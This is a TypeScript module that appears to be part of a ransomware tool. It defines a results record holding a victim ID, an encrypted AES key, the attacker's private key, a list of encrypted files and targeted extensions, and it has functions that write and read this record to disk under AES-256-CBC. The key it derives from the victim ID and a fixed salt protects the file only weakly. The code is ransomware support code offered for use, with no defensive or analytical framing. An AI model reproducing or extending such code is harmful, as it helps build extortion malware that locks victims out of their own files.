import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

// Interface to define the encryption results structure
export interface EncryptionResults {
    victimId: string;
    encryptedAESKey: Buffer;
    attackerPrivateKey: string;
    encryptedFiles: string[];
    encryptionStats: {
        totalFiles: number;
        totalSize: number;
        encryptionTime: number;
        targetExtensions: string[];
        timestamp: Date;
    };
}

// File name where results will be stored
const RESULTS_FILENAME = 'encryption_results.dat';

// Simple encryption key derived from victim ID to protect the stored data
function deriveStorageKey(victimId: string): Buffer {
    return crypto.createHash('sha256').update(victimId + 'storage_key_salt').digest();
}

/**
 * Save encryption results to a persistent file
 * @param results Encryption results to save
 * @param customPath Optional custom path to save the results
 * @returns Path to the saved file
 */
export function saveEncryptionResults(
    results: EncryptionResults,
    customPath?: string
): string {
    try {
        // Create serializable object (Buffer needs special handling)
        const serializableResults = {
            ...results,
            encryptedAESKey: results.encryptedAESKey.toString('base64'),
        };

        // Convert to JSON string
        const jsonString = JSON.stringify(serializableResults, null, 2);

        // Derive a key for encrypting the stored results
        const storageKey = deriveStorageKey(results.victimId);
        
        // Generate an IV for AES encryption
        const iv = crypto.randomBytes(16);
        
        // Encrypt the JSON string
        const cipher = crypto.createCipheriv('aes-256-cbc', storageKey, iv);
        let encrypted = cipher.update(jsonString, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        
        // Prepare the final data with IV prefixed
        const finalData = {
            iv: iv.toString('base64'),
            data: encrypted,
            victimId: results.victimId // Keep victim ID unencrypted for identification
        };
        
        // Determine where to save the file
        const savePath = customPath 
            ? path.join(customPath, RESULTS_FILENAME)
            : path.join(process.cwd(), RESULTS_FILENAME);
        
        // Write to file
        fs.writeFileSync(savePath, JSON.stringify(finalData), 'utf8');
        
        return savePath;
    } catch (error) {
        console.error('Error saving encryption results:', error);
        throw new Error(`Failed to save encryption results: ${error}`);
    }
}

/**
 * Load encryption results from a persistent file
 * @param filePath Path to the results file or directory containing the file
 * @param victimId Optional victimId for verification
 * @returns Loaded encryption results
 */
export function loadEncryptionResults(
    filePath: string, 
    victimId?: string
): EncryptionResults {
    try {
        // Determine correct file path
        let resultPath: string;
        
        // If the path is a directory, look for the results file
        if (fs.statSync(filePath).isDirectory()) {
            resultPath = path.join(filePath, RESULTS_FILENAME);
        } else {
            resultPath = filePath;
        }
        
        // Read encrypted data from file
        const encryptedData = JSON.parse(fs.readFileSync(resultPath, 'utf8'));
        
        // Verify victim ID if provided
        if (victimId && encryptedData.victimId !== victimId) {
            throw new Error('Victim ID mismatch. Cannot load encryption results.');
        }
        
        // Get the victim ID from the file
        const retrievedVictimId = encryptedData.victimId;
        
        // Derive the storage key using the victim ID
        const storageKey = deriveStorageKey(retrievedVictimId);
        
        // Parse the IV from the stored data
        const iv = Buffer.from(encryptedData.iv, 'base64');
        
        // Decrypt the data
        const decipher = crypto.createDecipheriv('aes-256-cbc', storageKey, iv);
        let decrypted = decipher.update(encryptedData.data, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        
        // Parse the JSON string back to an object
        const jsonResults = JSON.parse(decrypted);
        
        // Convert the base64 AES key back to Buffer
        const results: EncryptionResults = {
            ...jsonResults,
            encryptedAESKey: Buffer.from(jsonResults.encryptedAESKey, 'base64'),
            encryptionStats: {
                ...jsonResults.encryptionStats,
                timestamp: new Date(jsonResults.encryptionStats.timestamp)
            }
        };
        
        return results;
    } catch (error) {
        console.error('Error loading encryption results:', error);
        throw new Error(`Failed to load encryption results: ${error}`);
    }
}

/**
 * Check if encryption results file exists in a directory
 * @param directory Directory to check for encryption results
 * @returns True if results file exists, false otherwise
 */
export function encryptionResultsExist(directory: string): boolean {
    const resultPath = path.join(directory, RESULTS_FILENAME);
    return fs.existsSync(resultPath);
}
